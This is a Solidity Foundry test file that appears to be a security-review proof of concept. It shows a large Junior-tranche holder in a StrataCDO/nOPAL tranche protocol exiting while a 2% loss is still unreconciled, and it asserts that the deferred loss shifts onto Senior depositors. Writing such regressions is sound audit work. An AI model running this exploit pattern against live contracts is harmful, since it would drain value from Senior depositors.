// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {console2} from "forge-std/Test.sol";
import {NestOpalDYSStaleLossPoC} from "./NestOpalDYSStaleLossPoC.t.sol";
import {IStrataCDO} from "../../contracts/tranches/interfaces/IStrataCDO.sol";

/// @notice Stress regression showing that stale-loss JRT exits can exhaust first-loss capital
///         and push a deferred nOPAL loss into Senior even though Junior could have absorbed
///         the entire loss if reconciliation happened before the exit.
contract NestOpalDYSStaleLossSeniorSpill is NestOpalDYSStaleLossPoC {
    function test_CurrentLikeCoverageWhaleExitCanPushDeferredLossIntoSenior() public {
        // Build ~590% JRT/SRT coverage, close to the live nOPAL market composition seen
        // during review. The attacker owns nearly all Junior capital but the honest victim
        // leaves 100 USDC of JRT, still above the 7.5% hard minimum against 1,000 SRT.
        uint256 extraAttackerJunior = 5_500 * ONE;
        nOpal.mint(attacker, extraAttackerJunior);
        attackerShares += _depositJrt(attacker, extraAttackerJunior);

        assertApproxEqAbs(accounting.jrtNav(), 5_900 * ONE, 2, "current-like JRT NAV");
        assertApproxEqAbs(accounting.srtNav(), 1_000 * ONE, 2, "current-like SRT NAV");
        assertApproxEqAbs(cdo.coverage(), 5_900_000, 10, "current-like coverage ppm");

        (IStrataCDO.TExitMode mode, uint256 exitFee, uint32 lockSeconds) =
            cdo.calculateExitMode(address(jrtVault), attacker);
        assertEq(uint256(mode), uint256(IStrataCDO.TExitMode.Fee), "whale exit must be immediate Fee mode");
        assertEq(exitFee, 0.0015e18, "production JRT exit fee");
        assertEq(lockSeconds, 0, "no SharesLock above 30% coverage");

        // A legitimate 2% nOPAL accountant-rate loss arrives. With no early exit, JRT=5,900
        // can absorb the full 138-USDC system loss and Senior should remain whole.
        vm.warp(block.timestamp + 1 hours);
        nestAccountant.setExchangeRate(980_000);
        assertEq(strategy.totalAssets(), 6_762 * ONE, "live strategy NAV after 2% loss");
        assertEq(
            strategy.totalAssets(accounting.nav(), accounting.lastReconciliation()),
            accounting.nav(),
            "loss remains hidden during vulnerable 24h window"
        );

        uint256 snap = vm.snapshot();

        // Control: allow the loss to reconcile before the whale exits.
        vm.warp(accounting.lastReconciliation() + 24 hours + 1);
        nOpal.mint(victim, ONE);
        _depositJrt(victim, ONE); // ordinary tranche action triggers reconciliation first
        uint256 controlSrtNav = accounting.srtNav();
        uint256 controlJrtNav = accounting.jrtNav();

        vm.revertTo(snap);

        // Attack: whale exits while accounting still carries the pre-loss NAV. The stale USDC
        // claim is converted at the lower live nOPAL rate, consuming extra strategy shares.
        uint256 attackerNOpalBefore = nOpal.balanceOf(attacker);
        vm.prank(attacker);
        uint256 attackerTokenOut = jrtVault.redeem(address(nOpal), attackerShares, attacker, attacker);
        uint256 attackerNOpalReceived = nOpal.balanceOf(attacker) - attackerNOpalBefore;
        assertEq(attackerNOpalReceived, attackerTokenOut, "direct nOPAL receipt");

        uint256 postExitStoredJrt = accounting.jrtNav();
        uint256 postExitStoredSrt = accounting.srtNav();
        uint256 postExitLiveNav = strategy.totalAssets();

        // Once the 24h gate expires, the next ordinary tranche action recognizes the deficit.
        vm.warp(accounting.lastReconciliation() + 24 hours + 1);
        nOpal.mint(victim, ONE);
        _depositJrt(victim, ONE);
        uint256 attackSrtNav = accounting.srtNav();
        uint256 attackJrtNav = accounting.jrtNav();

        console2.log("control JRT after reconciliation (USDC 6d)", controlJrtNav);
        console2.log("control SRT after reconciliation (USDC 6d)", controlSrtNav);
        console2.log("attack stored JRT immediately after whale exit (USDC 6d)", postExitStoredJrt);
        console2.log("attack stored SRT immediately after whale exit (USDC 6d)", postExitStoredSrt);
        console2.log("attack live strategy NAV immediately after whale exit (USDC 6d)", postExitLiveNav);
        console2.log("attack JRT after delayed reconciliation (USDC 6d)", attackJrtNav);
        console2.log("attack SRT after delayed reconciliation (USDC 6d)", attackSrtNav);
        console2.log("Senior loss caused by stale-loss whale exit (USDC 6d)", controlSrtNav - attackSrtNav);

        assertApproxEqAbs(controlSrtNav, 1_000 * ONE, 2, "without stale exit Junior absorbs entire 2% loss");
        assertLt(attackSrtNav, controlSrtNav, "stale-loss whale exit must push deferred loss into Senior");
        assertGt(controlSrtNav - attackSrtNav, 1 * ONE, "Senior spill must be economically material");
    }
}
